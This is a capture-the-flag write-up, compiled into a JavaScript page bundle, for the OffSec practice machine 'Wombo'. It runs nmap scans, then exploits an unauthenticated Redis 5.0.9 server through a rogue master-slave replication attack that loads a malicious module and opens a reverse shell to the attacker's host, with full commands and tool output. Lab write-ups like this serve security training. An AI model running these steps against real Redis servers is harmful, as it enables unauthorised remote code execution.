(window.webpackJsonp=window.webpackJsonp||[]).push([[16],{385:function(t,s,e){"use strict";e.r(s);var a=e(44),n=Object(a.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"wombo"}},[t._v("Wombo")]),t._v(" "),e("p",[t._v("OFFSEC Praactice Warm UP Machine")]),t._v(" "),e("h2",{attrs:{id:"summary"}},[t._v("Summary")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th",[t._v("Box Name")]),t._v(" "),e("th",[t._v("IP")])])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("WOMBO")]),t._v(" "),e("td",[t._v("192.168.199.69")])])])]),t._v(" "),e("h2",{attrs:{id:"initial-foothold"}},[t._v("Initial Foothold")]),t._v(" "),e("p",[t._v("Lets start by doing the nmap scan of the box")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ nmap -sV -sT -sC -o nmapinitial "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69\nPORT     STATE  SERVICE    VERSION\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("22")]),t._v("/tcp   "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v("        OpenSSH "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("7")]),t._v(".4p1 Debian "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),t._v("+deb9u7 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("protocol "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("2.0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ssh-hostkey: \n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("2048")]),t._v(" 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("RSA"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("256")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("83")]),t._v(":f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ECDSA"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_  "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("256")]),t._v(" 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ED25519"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("53")]),t._v("/tcp   closed domain\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("/tcp   "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   http       nginx "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.10")]),t._v(".3\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_http-server-header: nginx/1.10.3\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_http-title: Welcome to nginx"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),t._v("/tcp "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   http-proxy\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" http-robots.txt: "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v(" disallowed entries \n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_/admin/ /reset/ /compose\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_http-title: Home "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" NodeBB\n\n\n")])])]),e("p",[t._v("Port "),e("code",[t._v("80")]),t._v(" and "),e("code",[t._v("8080")]),t._v(" is open lets visit these ports and in background lets run full port scan for the box.")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ nmap -p- "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69 -o nmap-fullscan\n")])])]),e("h3",{attrs:{id:"port-8080"}},[t._v("Port 8080")]),t._v(" "),e("p",[t._v("Let's start with port 8080 because it has interesting file "),e("code",[t._v("robots.txt")])]),t._v(" "),e("p",[e("code",[t._v("robots.txt")]),t._v(" shows three interesting files")]),t._v(" "),e("div",{staticClass:"language-docs extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("â”œâ”€â”€ /admin/\nâ”œâ”€â”€ /reset/\nâ”œâ”€â”€ /compose\n")])])]),e("p",[t._v("Upon visting the site we found it is using "),e("code",[t._v("NodeBB")]),t._v(". Let's check for any existing exploits using searchsploit.")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ searchsploit NodeBB       \n-------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                      "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  Path\n-------------------------------------------------------------------- ---------------------------------\nNodeBB Forum "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.12")]),t._v(".2-1.14.2 - Account Takeover                       "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" multiple/webapps/48875.txt\nNodeBB Plugin Emoji "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("3.2")]),t._v(".1 - Arbitrary File Write                    "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" multiple/webapps/49813.py\n-------------------------------------------------------------------- ---------------------------------\n")])])]),e("p",[t._v("Searchsploit gave two results but the "),e("code",[t._v("NodeBB")]),t._v(" doesn't seem to be vulnerable to both of them.")]),t._v(" "),e("p",[t._v("Let's move on to another port to see anything interesting.")]),t._v(" "),e("h3",{attrs:{id:"nmap-full-port-scan"}},[t._v("Nmap Full Port Scan")]),t._v(" "),e("p",[t._v("We got results from Nmap port scan. Before moving to port "),e("code",[t._v("80")]),t._v(" Let's see if we get some other interesting ports which can be exploited easily.")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ nmap -p- "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69 -o nmap-fullscan\nNot shown: "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("65529")]),t._v(" filtered ports\nPORT      STATE  SERVICE\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("22")]),t._v("/tcp    "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("53")]),t._v("/tcp    closed domain\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("/tcp    "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   http\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("6379")]),t._v("/tcp  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   redis\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),t._v("/tcp  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   http-proxy\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("27017")]),t._v("/tcp "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   mongod\n")])])]),e("p",[e("code",[t._v("Port 6379")]),t._v(" is open. It looks like easy target. Let's try to exploit it.")]),t._v(" "),e("h3",{attrs:{id:"port-6379-redis"}},[t._v("Port 6379 -  Redis")]),t._v(" "),e("p",[t._v("First lets install redis-cli in our machine.")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("apt-get")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("install")]),t._v(" redis-tools\n")])])]),e("p",[t._v("Connecting to redis server")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ redis-cli -h "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69:637"),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("9")]),t._v(">")]),t._v("\n")])])]),e("p",[t._v("We are now connected to redis server.\nNow, if we read Redis' security page, we will come across the following statement.")]),t._v(" "),e("p",[t._v("â€œInternally, Redis uses all the well known practices for writing secure code, to prevent buffer overflows, format bugs and other memory corruption issues. However, the ability to control the server configuration using the CONFIG command makes the client able to change the working dir of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to compromise the system and/or run untrusted code as the same user as Redis is running.â€")]),t._v(" "),e("p",[t._v("Which simply mean we can achieve RCE from this.")]),t._v(" "),e("h2",{attrs:{id:"geting-shell"}},[t._v("Geting Shell")]),t._v(" "),e("p",[t._v("First lets connect to redis server")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ redis-cli -h "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69\n"),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69:637"),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("9")]),t._v(">")]),t._v("\n")])])]),e("p",[t._v("Get the redis version by using "),e("code",[t._v("INFO")]),t._v(" command")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69:637"),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("9")]),t._v(">")]),t._v(" INFO\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# Server")]),t._v("\nredis_version:5.0.9\n\n")])])]),e("p",[t._v("The redis versio is 5.x so we can use Redis master-slave replication to get shell. For this we have to generate malicious .so file and exploit the machine.")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("git")]),t._v(" clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\n$ "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" RedisModules-ExecuteCommand/\n$ "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("make")]),t._v("\n")])])]),e("p",[t._v("Now lets use the module.so file to get shell on server")]),t._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("git")]),t._v(" clone https://github.com/Ridter/redis-rce.git\n$ "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" redis-rce/\n$ "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("cp")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v("/RedisModules-ExecuteCommand/src/module.so ./\n$ pip "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("install")]),t._v(" -r requirements.txt \n$ python redis-rce.py -r "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".28.152 -p "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("6379")]),t._v(" -L "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".28.137 -P "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),t._v(" -f module.so\n")])])]),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ python redis-rce.py -r "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69 -L "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".49.199 --lport "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),t._v(" -f module.so   \n\nâ–ˆâ–„â–„â–„â–„ â–„â–ˆâ–ˆâ–ˆâ–„   â–ˆâ–ˆâ–„   â–„â–ˆ    â–„â–„â–„â–„â–„       â–ˆâ–„â–„â–„â–„ â–„â–ˆâ–„    â–„â–ˆâ–ˆâ–ˆâ–„   \nâ–ˆ  â–„â–€ â–ˆâ–€   â–€  â–ˆ  â–ˆ  â–ˆâ–ˆ   â–ˆ     â–€â–„     â–ˆ  â–„â–€ â–ˆâ–€ â–€â–„  â–ˆâ–€   â–€  \nâ–ˆâ–€â–€â–Œ  â–ˆâ–ˆâ–„â–„    â–ˆ   â–ˆ â–ˆâ–ˆ â–„  â–€â–€â–€â–€â–„       â–ˆâ–€â–€â–Œ  â–ˆ   â–€  â–ˆâ–ˆâ–„â–„    \nâ–ˆ  â–ˆ  â–ˆâ–„   â–„â–€ â–ˆ  â–ˆ  â–â–ˆ  â–€â–„â–„â–„â–„â–€        â–ˆ  â–ˆ  â–ˆâ–„  â–„â–€ â–ˆâ–„   â–„â–€ \n  â–ˆ   â–€â–ˆâ–ˆâ–ˆâ–€   â–ˆâ–ˆâ–ˆâ–€   â–                  â–ˆ   â–€â–ˆâ–ˆâ–ˆâ–€  â–€â–ˆâ–ˆâ–ˆâ–€   \n â–€                                     â–€                   \n\ns\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Connecting to  "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69:6379"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Sending SLAVEOF "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("command")]),t._v(" to server\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("+"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Accepted connection from "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69:6379\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Setting filename\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("+"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Accepted connection from "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69:6379\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Start listening on "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".49.199:8080\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Tring to run payload\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("+"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Accepted connection from "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".199.69:32799\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Closing rogue server"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\n\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("+"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" What "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("do")]),t._v(" u want ? "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("i"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("nteractive shell or "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("r"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("everse shell or "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("e"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("xit: \n\n")])])]),e("p",[t._v("Press r and get reverse shell ğŸ˜ƒ")]),t._v(" "),e("p",[t._v("Happy Hacking ....")])])}),[],!1,null,null,null);s.default=n.exports}}]);